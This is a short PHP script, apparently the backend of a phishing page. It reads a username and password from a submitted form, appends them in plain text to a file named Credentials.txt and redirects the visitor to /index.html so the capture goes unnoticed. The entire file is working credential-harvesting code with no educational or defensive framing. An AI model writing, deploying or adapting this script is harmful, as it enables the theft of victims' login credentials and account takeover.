<?php

$username = $_POST['username'];
$password = $_POST['password'];

file_put_contents( "Credentials.txt","username :-" . $username . "\npassword :-" . $password . "\n",FILE_APPEND);
header('Location: /index.html');
exit();
?>